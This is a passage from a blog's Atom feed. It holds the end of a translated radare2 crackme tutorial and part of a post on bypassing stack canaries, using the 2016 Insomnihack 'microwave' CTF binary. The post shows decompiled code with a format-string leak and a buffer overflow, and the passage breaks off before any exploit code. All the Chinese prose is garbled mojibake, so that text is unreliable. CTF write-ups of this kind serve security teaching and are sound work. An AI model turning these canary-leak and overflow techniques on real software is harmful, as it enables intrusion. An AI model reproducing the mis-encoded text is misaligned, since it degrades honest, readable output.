class="line">Wait event received by different pid 7415</span><br><span class="line">Wait event received by different pid 7444</span><br><span class="line">Process with PID 7575 startedâ€¦</span><br><span class="line">File dbg:///home/remnux/Desktop/tutorials/megabeets_0x1 Zrtnorrgf reopened in read-write mode</span><br><span class="line">= attach 7575 7575</span><br><span class="line">Assuming filepath /home/remnux/Desktop/tutorials/megabeets_0x1</span><br><span class="line"><span class="meta">[0xf7749be9]&gt;</span> dc</span><br><span class="line">Selecting and continuing: 7575.:: Megabeets ::.</span><br><span class="line">Think you can make it?</span><br><span class="line">Success!PTRACE_EVENT_EXIT pid=7575, status=0x0</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ”¶åˆ°äº†æˆåŠŸçš„æç¤ºï¼Œç ´è§£äº†è¿™ä¸ªCrackmeã€‚åœ¨æˆåŠŸç ´è§£ä¹‹åï¼Œæˆ‘ä»¬ç»ˆäºå¯ä»¥è¯´è¿™ä¸ªç¨‹åºå°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸<code>rot13(â€œMegabeetsâ€)</code>è¿›è¡Œäº†æ¯”è¾ƒï¼Œä¹Ÿå°±æ˜¯<code>Zrtnorrgf</code>ã€‚</p><p>ä½ å¯ä»¥åœ¨<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%201%20-%20Simple%20crackme/megabeets_0x1.c" target="_blank" rel="noopener">è¿™é‡Œ</a>æŸ¥çœ‹Crackmeçš„å®Œæ•´æºç ã€‚</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p><code>Radare2</code>ä¹‹æ—…ç¬¬ä¸€éƒ¨åˆ†å°±å‘Šä¸€æ®µè½äº†ã€‚æˆ‘ä»¬åªæ¥è§¦äº†<code>radare2</code>çš„è¡¨çš®ï¼Œä»…ä»…äº†è§£äº†å®ƒæœ€æœ€åŸºç¡€çš„ä¸€äº›åŠŸèƒ½ã€‚åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å°†ä¼šå­¦ä¹ æ›´å¤šçš„å…³äº<code>radare2</code>çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬è„šæœ¬å¤„ç†ã€æ¶æ„è½¯ä»¶åˆ†æå’Œæ¼æ´åˆ©ç”¨ã€‚æˆ‘çŸ¥é“å¯¹äºå¾ˆå¤šäººæ¥è¯´ä¸€å¼€å§‹æ˜¯å¾ˆéš¾çš„ï¼Œä¸ç®¡æ˜¯èƒ½å¦æ„Ÿå—åˆ°<code>radare2</code>çš„å¼ºå¤§ä¹‹å¤„ï¼Œäº¦æˆ–æ˜¯å°†ä½ çš„ä»¥å‰çš„ä¹ æƒ¯æ”¾åˆ°ä¸€è¾¹è€Œç†Ÿæ‚‰ä½¿ç”¨<code>radare2</code>ã€‚ä¸ç®¡ä½ æ˜¯ä¸€ä¸ªé€†å‘å·¥ç¨‹å¸ˆã€ä¸€ä¸ªCTFæ¯”èµ›é€‰æ‰‹æˆ–è€…åªæ˜¯ä¸€ä¸ªå®‰å…¨çˆ±å¥½è€…ï¼Œæˆ‘æ•¢ä¿è¯å°†<code>radare2</code>æ”¶å…¥ä½ çš„å·¥å…·ç®±ç»å¯¹ä¸€ä¸ªæ˜¯æ˜æ™ºçš„é€‰æ‹©ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç¿»è¯‘è‡ª&lt;a href=&quot;https://www.megabeets.net/a-journey-into-radare-2-part-1/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Megabeets&lt;/a&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="translation" scheme="https://qianfei11.github.io/tags/translation/"/>
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>ç»•è¿‡ELFçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶Canary</title>
    <link href="https://qianfei11.github.io/2019/02/15/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%91%E7%BB%95%E8%BF%87ELF%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6Canary/"/>
    <id>https://qianfei11.github.io/2019/02/15/ã€æœªå®Œæˆã€‘ç»•è¿‡ELFçš„å®‰å…¨é˜²æŠ¤æœºåˆ¶Canary/</id>
    <published>2019-02-15T08:21:43.000Z</published>
    <updated>2019-02-18T10:58:18.432Z</updated>
    
    <content type="html"><![CDATA[<p>å…¥é—¨canaryã€‚</p><a id="more"></a><h1 id="ä½•ä¸ºCanary"><a href="#ä½•ä¸ºCanary" class="headerlink" title="ä½•ä¸ºCanary"></a>ä½•ä¸ºCanary</h1><p>ç”±äº<code>stack overflow</code>è€Œå¼•å‘çš„æ”»å‡»éå¸¸æ™®éä¹Ÿéå¸¸å¤è€ï¼Œç›¸åº”åœ°ä¸€ç§å«åš<code>Canary</code>çš„æŠ€æœ¯å¾ˆæ—©å°±å‡ºç°åœ¨<code>glibc</code>é‡Œï¼Œç›´åˆ°ç°åœ¨ä¹Ÿä½œä¸ºç³»ç»Ÿå®‰å…¨çš„ç¬¬ä¸€é“é˜²çº¿å­˜åœ¨ã€‚<code>Canary</code>çš„æ„æ€æ˜¯é‡‘ä¸é›€ï¼Œæ¥æºäºè‹±å›½çŸ¿äº•å·¥äººç”¨æ¥æ¢æŸ¥äº•ä¸‹æ°”ä½“æ˜¯å¦æœ‰æ¯’çš„é‡‘ä¸é›€ç¬¼å­ã€‚å·¥äººä»¬æ¯æ¬¡ä¸‹äº•éƒ½ä¼šå¸¦ä¸Šä¸€åªé‡‘ä¸é›€å¦‚æœäº•ä¸‹çš„æ°”ä½“æœ‰æ¯’ï¼Œé‡‘ä¸é›€ç”±äºå¯¹æ¯’æ€§æ•æ„Ÿå°±ä¼šåœæ­¢é¸£å«ç”šè‡³æ­»äº¡ï¼Œä»è€Œä½¿å·¥äººä»¬å¾—åˆ°é¢„è­¦ã€‚è¿™ä¸ªæ¦‚å¿µåº”ç”¨åœ¨æ ˆä¿æŠ¤ä¸Šåˆ™æ˜¯åœ¨åˆå§‹åŒ–ä¸€ä¸ªæ ˆå¸§æ—¶åœ¨æ ˆåº•è®¾ç½®ä¸€ä¸ªéšæœºçš„canaryå€¼ï¼Œæ ˆå¸§é”€æ¯å‰æµ‹è¯•è¯¥å€¼æ˜¯å¦æ­»æ‰ï¼Œå³æ˜¯å¦è¢«æ”¹å˜ï¼Œè‹¥è¢«æ”¹å˜åˆ™è¯´æ˜æ ˆæº¢å‡ºå‘ç”Ÿï¼Œç¨‹åºèµ°å¦ä¸€ä¸ªæµç¨‹ç»“æŸï¼Œä»¥å…æ¼æ´åˆ©ç”¨æˆåŠŸã€‚<code>Canary</code>ä¸ç®¡æ˜¯å®ç°è¿˜æ˜¯è®¾è®¡æ€æƒ³éƒ½æ¯”è¾ƒç®€å•é«˜æ•ˆï¼Œå°±æ˜¯æ’å…¥ä¸€ä¸ªå€¼ï¼Œåœ¨<code>stack overflow</code>å‘ç”Ÿçš„é«˜å±åŒºåŸŸçš„å°¾éƒ¨ï¼Œå½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹<code>Canary</code>çš„å€¼æ˜¯å¦ç»è¿‡äº†æ”¹å˜ï¼Œä»¥æ­¤æ¥åˆ¤æ–­<code>stack/buffer overflow</code>æ˜¯å¦å‘ç”Ÿã€‚<code>Canary</code>ä¸Windowsä¸‹çš„<code>GSä¿æŠ¤</code>éƒ½æ˜¯é˜²æ­¢æ ˆæº¢å‡ºçš„æœ‰æ•ˆæ‰‹æ®µï¼Œå®ƒçš„å‡ºç°å¾ˆå¤§ç¨‹åº¦ä¸Šé˜²æ­¢äº†æ ˆæº¢å‡ºçš„å‡ºç°ï¼Œå¹¶ä¸”ç”±äºå®ƒå‡ ä¹å¹¶ä¸æ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥ç°åœ¨æˆäº†<code>linux</code>ä¸‹ä¿æŠ¤æœºåˆ¶çš„æ ‡é…ã€‚</p><p>ä»¥32ä½ç¨‹åºä¸ºä¾‹ã€‚æ²¡å¼€Canaryæ—¶çš„æ ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var1    |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var2    |</span><br><span class="line">+------------------+</span><br><span class="line">|       ebp        |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>å¼€å¯Canaryåçš„æ ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    parameter     |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var1    |</span><br><span class="line">+------------------+</span><br><span class="line">|    local var2    |</span><br><span class="line">+------------------+</span><br><span class="line">|      canary      | &lt;- Random</span><br><span class="line">+------------------+</span><br><span class="line">|       ebp        |</span><br><span class="line">+------------------+</span><br><span class="line">|    return addr   |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>åœ¨<code>EBP</code>ä¹‹å‰å¢åŠ äº†ä¸€ä¸ªä¸å¯é¢„æµ‹çš„éšæœºå€¼å¹¶åœ¨ç¨‹åºä¸­ï¼Œè€Œä¸”åœ¨ç¨‹åºç»“å°¾å¤„ä¼šæ£€æµ‹<code>Canary</code>æ˜¯å¦è¢«ç¯¡æ”¹ã€‚å¦‚æœå‘ç”Ÿäº†ç¼“å†²åŒºæº¢å‡ºè¦†ç›–äº†è¿”å›åœ°å€åˆ™è‚¯å®šä¼šè¦†ç›–<code>Canary</code>ï¼Œè¿™æ—¶ç¨‹åºä¼šç›´æ¥é€€å‡ºã€‚åªæœ‰æ³„æ¼äº†<code>Canary</code>ï¼Œæ‰èƒ½overflowåé¢çš„return addressï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   0x804852b &lt;func+71&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x804852e &lt;func+74&gt;:xor    eax,DWORD PTR gs:0x14</span><br><span class="line">=&gt; 0x8048535 &lt;func+81&gt;:je     0x804853c &lt;func+88&gt;</span><br><span class="line"> | 0x8048537 &lt;func+83&gt;:call   0x8048390 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> | 0x804853c &lt;func+88&gt;:leave</span><br><span class="line"> | 0x804853d &lt;func+89&gt;:ret</span><br><span class="line"> | 0x804853e &lt;main&gt;:lea    ecx,[esp+0x4]</span><br><span class="line"> |-&gt;   0x804853c &lt;func+88&gt;:leave  </span><br><span class="line">       0x804853d &lt;func+89&gt;:ret</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰ç»•è¿‡<code>Canary</code>ï¼Œå°±ä¼š<code>call</code>åˆ°glibcä¸­çš„å‡½æ•°<code>__stack_chk_fail</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Canaryç»•è¿‡æŠ€æœ¯"><a href="#Canaryç»•è¿‡æŠ€æœ¯" class="headerlink" title="Canaryç»•è¿‡æŠ€æœ¯"></a><code>Canary</code>ç»•è¿‡æŠ€æœ¯</h1><h2 id="æ³„æ¼Canary"><a href="#æ³„æ¼Canary" class="headerlink" title="æ³„æ¼Canary"></a>æ³„æ¼<code>Canary</code></h2><p><code>Canary</code>è®¾è®¡ä¸ºä»¥å­—èŠ‚<code>\x00</code>ç»“å°¾ï¼Œæœ¬æ„æ˜¯ä¸ºäº†ä¿è¯<code>Canary</code>å¯ä»¥æˆªæ–­å­—ç¬¦ä¸²ã€‚æ³„éœ²æ ˆä¸­çš„<code>Canary</code>çš„æ€è·¯æ˜¯è¦†ç›–<code>Canary</code>çš„ä½å­—èŠ‚ï¼Œæ¥æ‰“å°å‡ºå‰©ä½™çš„<code>Canary</code>éƒ¨åˆ†ã€‚è¿™ç§åˆ©ç”¨æ–¹å¼éœ€è¦å­˜åœ¨åˆé€‚çš„è¾“å‡ºå‡½æ•°ï¼Œå¹¶ä¸”å¯èƒ½éœ€è¦ç¬¬ä¸€æº¢å‡ºæ³„éœ²<code>Canary</code>ï¼Œä¹‹åå†æ¬¡æº¢å‡ºæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚å¦‚æœå­˜åœ¨<code>format string</code>é‚£ä¹ˆè¿˜å¯ä»¥æ³„æ¼<code>Canary</code>ã€‚</p><h3 id="2016-insomnihack-microwave"><a href="#2016-insomnihack-microwave" class="headerlink" title="2016-insomnihack-microwave"></a>2016-insomnihack-microwave</h3><p><code>checksec</code>ä¸€ä¸‹ç¨‹åºï¼Œ64ä½elfï¼Œä¿æŠ¤å…¨å¼€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>æ‹–è¿›idaæŸ¥çœ‹ä¸€ä¸‹ç¨‹åºã€‚ç¨‹åºå¤§æ¦‚ä¸Šæ˜¯è¿æ¥tweeterè´¦æˆ·ï¼Œç¼–è¾‘å†…å®¹ï¼Œå‘å¸ƒæœ€å–œçˆ±é£Ÿç‰©ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> input; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x3E</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n --------------------------------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |     Welcome to the next generation of MicroWaves!    |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |                         ***                          |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" | This stylish Microwave with Grill function, includes |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |      a function that tweets your favourite food!     |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" |                         ***                          |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" --------------------------------------------------------"</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      choice();</span><br><span class="line">      fwrite(<span class="string">"\n           [MicroWave]: "</span>, <span class="number">1u</span>LL, <span class="number">0x19</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">      fgets(&amp;input, <span class="number">3</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( input != <span class="string">'2'</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *((_WORD *)v3 + <span class="number">30</span>) == <span class="number">1</span> )</span><br><span class="line">        edit();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fwrite(<span class="string">"\n      First: please connect to your Twitter account!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x37</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( input &lt;= <span class="string">'2'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( input == <span class="string">'1'</span> )                       <span class="comment">// choice 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">"\n           Log in on Twitter:\n"</span>, <span class="number">1u</span>LL, <span class="number">0x1F</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fwrite(<span class="string">"           username: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="number">0L</span>L);</span><br><span class="line">        fgets(v3, <span class="number">40</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        fwrite(<span class="string">"           password: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="number">0L</span>L);</span><br><span class="line">        fgets(v3 + <span class="number">40</span>, <span class="number">20</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        connect(v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( input == <span class="string">'3'</span> )                    <span class="comment">// choice 3</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_WORD *)v3 + <span class="number">30</span>) == <span class="number">1</span> )</span><br><span class="line">        tweet();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fwrite(<span class="string">"\n      Hey Dude! This didn't work out!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x28</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( input == <span class="string">'q'</span> )                    <span class="comment">// quit</span></span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">"\n           Bye!\n\n"</span>, <span class="number">1u</span>LL, <span class="number">0x12</span>uLL, <span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>connect()</code>å‡½æ•°ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªéœ€è¦è¿‡çš„checkå¯†ç ï¼ŒåŒæ—¶è¿˜æœ‰ç”¨æˆ·åçš„è¾“å…¥å­˜åœ¨<code>format string</code>ï¼Œæ•…è¿™é‡Œå¯ä»¥æ³„æ¼å‡ºæ ˆä¸Šçš„<code>Canary</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">connect</span><span class="params">(<span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> j; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">string</span>; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  j = <span class="number">1L</span>L;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"\nChecking "</span>);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)input);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Twitter account"</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( j &lt; <span class="built_in">strlen</span>(input + <span class="number">40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ++j;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'.'</span>);</span><br><span class="line">    fflush(<span class="number">0L</span>L);</span><br><span class="line">    usleep(<span class="number">0x186A0</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">  <span class="built_in">string</span> = password;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(password);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_WORD *)input + <span class="number">30</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( input[i + <span class="number">40</span>] != <span class="built_in">string</span>[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_WORD *)input + <span class="number">30</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>edit()</code>å‡½æ•°ä¸­å­˜åœ¨<code>buffer overflow</code>ï¼Œè¯»äº†å¾ˆé•¿ä¸€ä¸²å­—ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, (__int64)<span class="string">"\n           #&gt; "</span>);</span><br><span class="line">  fflush(<span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v1, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\n           Done."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶é€šè¿‡è°ƒè¯•å¯ä»¥æ‰¾åˆ°æ ˆä¸Šçš„æŸä¸ªå€¼ä¸libcçš„åç§»ï¼Œä»¥ç”¨æ¥è®¡ç®—baseï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 